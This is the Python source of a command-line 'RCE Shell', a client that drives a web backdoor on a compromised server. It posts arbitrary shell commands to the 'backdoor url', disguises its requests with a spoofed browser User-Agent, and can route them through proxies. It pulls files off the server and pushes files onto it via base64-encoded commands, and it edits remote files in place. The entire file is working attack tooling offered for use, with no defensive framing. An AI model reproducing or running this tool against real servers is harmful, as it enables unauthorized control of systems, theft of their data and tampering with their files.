# -*- coding: utf-8 -*-
"""
Python RCE Shell
"""
import argparse
import base64
import enum
import io
import logging
import os
import readline
import shlex
import subprocess
import sys
import tempfile
from cmd import Cmd
from functools import partial
from typing import Any, Dict, List, Optional, Sequence, Tuple

import requests

__version__ = '0.1.0'

BANNER = f"""
██████╗  ██████╗██████╗ ███████╗██╗  ██╗
██╔══██╗██╔════╝╚════██╗██╔════╝██║  ██║
██████╔╝██║      █████╔╝███████╗███████║
██╔══██╗██║      ╚═══██╗╚════██║██╔══██║
██║  ██║╚██████╗██████╔╝███████║██║  ██║
╚═╝  ╚═╝ ╚═════╝╚═════╝ ╚══════╝╚═╝  ╚═╝
                    by tz4678@gmail.com

Type '?' or 'help' for more information.
"""

EDITOR = os.environ.get('EDITOR', 'vim')
HISTFILE = os.path.expanduser('~/.rce_history')
HISTFILE_SIZE = 1000
ALL_PROXY = os.getenv('ALL_PROXY')
HTTP_PROXY = os.getenv('HTTP_PROXY', ALL_PROXY)
HTTPS_PROXY = os.getenv('HTTPS_PROXY', ALL_PROXY)
PROG = os.path.basename(sys.argv[0])


class Color(enum.Enum):
    Reset = '\033[0m'
    Black = '\033[30m'
    Red = '\033[31m'
    Green = '\033[32m'
    Yellow = '\033[33m'
    Blue = '\033[34m'
    Purple = '\033[35m'
    Cyan = '\033[36m'
    White = '\033[37m'


def colored(color: Color, s: str) -> str:
    return f'{color.value}{s}'


def echo(
    s: str = '',
    color: Color = Color.Reset,
    fp: io.TextIOBase = sys.stdout,
    nl: bool = True,
) -> None:
    fp.write(colored(color, s))
    if nl:
        fp.write('\n')
    fp.flush()


echoerr = partial(echo, color=Color.Red)


class RceClient:
    cmd_param = 'cmd'
    timeout = 10.0
    user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36'

    def __init__(
        self,
        url: str,
        *,
        cmd_param: Optional[str] = None,
        params: Optional[Dict[str, Any]] = None,
        session: Optional[requests.Session] = None,
        timeout: Optional[float] = None,
        user_agent: Optional[str] = None,
    ) -> None:
        super().__init__()
        self.url = url
        self.cmd_param = cmd_param or self.cmd_param
        self.params = dict(params or {})
        self.session: requests.Session = session or requests.session()
        self.timeout = timeout or self.timeout
        self.user_agent = user_agent or self.user_agent

    def wrap_command(self, command: str) -> str:
        return f'{command} 2>&1'

    def execute(self, command: str) -> str:
        command = self.wrap_command(command)
        params = self.params.copy()
        params[self.cmd_param] = command
        logging.debug(f'{params=}')
        proxies = {}
        if HTTP_PROXY:
            proxies['http'] = HTTP_PROXY
        if HTTPS_PROXY:
            proxies['https'] = HTTPS_PROXY
        logging.debug(f'{proxies=}')
        response: requests.Response = self.session.post(
            self.url,
            data=params,
            headers={'User-Agent': self.user_agent},
            proxies=proxies,
            timeout=self.timeout,
        )
        response.raise_for_status()
        return response.text


class RceShell(Cmd):
    intro = colored(Color.Blue, BANNER)
    prompt = colored(Color.Purple, f'({PROG}): ') + Color.Green.value

    def __init__(self, client: RceClient) -> None:
        self.client = client
        super().__init__()

    def emptyline(self) -> None:
        pass

    def do_exit(self, line: str) -> bool:
        "exit"
        return True

    def do_quit(self, line: str) -> bool:
        "exit"
        return self.do_exit(line)

    def do_q(self, line: str) -> bool:
        "exit"
        return self.do_exit(line)

    def do_EOF(self, line: str) -> bool:
        "exit"
        return self.do_exit(line)

    def preloop(self) -> None:
        if os.path.exists(HISTFILE):
            readline.read_history_file(HISTFILE)

    def postloop(self) -> None:
        readline.set_history_length(HISTFILE_SIZE)
        readline.write_history_file(HISTFILE)

    def parseline(self, line: str) -> Tuple[str, List[str], str]:
        cmd, rest, line = super().parseline(line)
        args = shlex.split(rest)
        return cmd, args, line

    def default(self, command: str) -> Any:
        try:
            output: str = self.client.execute(command)
            echo(output)
        except Exception as e:
            echoerr(e)

    def do_client_ip(self, args: Sequence[str]) -> None:
        try:
            r = self.client.session.get('https://api.ipify.org')
            echo(r.text)
        except Exception as e:
            echoerr(e)

    def do_server_ip(self, args: Sequence[str]) -> None:
        try:
            output = self.client.execute('curl -sS ifconfig.me')
            echo(output)
        except Exception as e:
            echoerr(e)

    def do_download(self, args: Sequence[str]) -> None:
        "download file from server"
        try:
            src, dest, *_ = args
        except ValueError:
            src, dest = args[0], ''
        try:
            filename = os.path.basename(src)
            filename = os.path.join(dest, filename)
            with open(filename, 'wb') as fp:
                self.download(src, fp)
                echo(f'Saved as {filename}')
        except Exception as e:
            echoerr(e)

    def do_upload(self, args: Sequence[str]) -> None:
        "upload local file to server"
        try:
            src, dest, *_ = args
        except ValueError:
            src, dest = args[0], ''
        try:
            with open(os.path.expanduser(src), 'rb') as fp:
                path = os.path.join(dest, os.path.basename(src))
                if self.upload(fp, path):
                    echo(f'Uploaded {path}')
                else:
                    echoerr('Upload error')
        except Exception as e:
            echoerr(e)

    def do_edit(self, args: Sequence[str]) -> None:
        "edit file on server"
        try:
            _, ext = os.path.splitext(args[0])
            with tempfile.NamedTemporaryFile(suffix=ext, delete=False) as temp:
                # скачиваем файл
                self.download(args[0], temp)
                modified = os.stat(temp.fileno()).st_mtime
                # редактируем
                subprocess.call([EDITOR, temp.name])
                # если время модфикации файла не изменилось не гоняем лишние байты
                # по сети
                if os.stat(temp.fileno()).st_mtime > modified:
                    temp.seek(0)
                    # загружаем на сервер
                    self.upload(temp, args[0])
                    echo('Saved')
                else:
                    echo('Not modified')
                # os.unlink(temp.name)
        except Exception as e:
            echoerr(e)

    def download(self, remote_path: str, writable: io.RawIOBase) -> int:
        enc = self.client.execute(f'base64 {remote_path}')
        content: bytes = base64.b64decode(enc)
        try:
            return writable.write(content)
        finally:
            writable.flush()

    def upload(self, readable: io.RawIOBase, remote_path: str) -> bool:
        content = readable.read()
        enc = base64.b64encode(content).decode()
        result = self.client.execute(
            f'echo "{enc}" | base64 -d > {remote_path}'
        )
        return result == ''


def parse_cmdline(argv: Sequence[str]) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument('url', help='backdoor url')
    parser.add_argument('-c', '--command', help='run one command and exit')
    parser.add_argument('--cmd-param')
    parser.add_argument(
        '-d',
        '--debug',
        action='store_true',
        default=False,
        help='show more verbose output',
    )
    parser.add_argument(
        '-p',
        '--param',
        default=[],
        dest='params',
        help='additional request param: param=value',
        nargs='+',
    )
    parser.add_argument('-t', '--timeout', type=float)
    parser.add_argument(
        '-v', '--version', action='version', version=f'v{__version__}'
    )
    parser.add_argument('--user-agent')
    return parser.parse_args(argv)


def main(argv: Sequence[str] = sys.argv[1:]) -> None:
    args = parse_cmdline(argv)
    logging.basicConfig(
        level=logging.DEBUG if args.debug else logging.WARNING,
        stream=sys.stderr,
    )
    params = dict(x.split('=', 1) for x in args.params)
    client = RceClient(
        args.url,
        cmd_param=args.cmd_param,
        params=params,
        user_agent=args.user_agent,
    )
    shell = RceShell(client)
    try:
        if args.command:
            shell.onecmd(args.command)
        else:
            shell.cmdloop()
    except KeyboardInterrupt:
        echo('bye!')
